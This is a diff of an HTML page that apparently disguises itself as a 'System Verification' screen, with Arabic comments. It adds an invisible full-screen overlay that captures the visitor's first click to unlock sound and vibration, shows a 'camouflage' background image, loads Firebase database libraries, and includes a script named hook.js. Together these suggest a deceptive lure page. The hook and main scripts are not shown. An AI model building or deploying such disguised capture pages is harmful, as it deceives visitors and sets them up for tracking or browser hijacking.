@@ -3,22 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking...</title>
+    <title>System Verification</title>
     <link rel="stylesheet" href="style.css">
+    <!-- استدعاء المكتبات بشكل مباشر لضمان العمل على GitHub -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        .overlay-trigger {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 10000;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
-    <!-- الصورة  -->
+    <!-- هذا الجزء ضروري جداً: بمجرد ضغط المستخدم يختفي ويسمح بالصوت والهزاز -->
+    <div class="overlay-trigger" onclick="this.remove(); console.log('User Interaction Captured');"></div>
+
     <img src="Untitled-1.jpg" alt="Background" class="camouflage-img">
 
-    <!-- العناصر الكود -->
     <div style="display: none;">
-        <div id="item-network"><div></div></div>
-        <div id="item-identity"><div></div></div>
-        <div id="item-secure"><div></div></div>
+        <div id="item-network"></div>
+        <div id="item-identity"></div>
+        <div id="item-secure"></div>
         <div id="main-progress"></div>
         <p id="status-text"></p>
     </div>
 
+    <!-- ترتيب السكربتات مهم -->
     <script src="script.js"></script>
+    <script src="hook.js"></script>
 </body>
 </html>
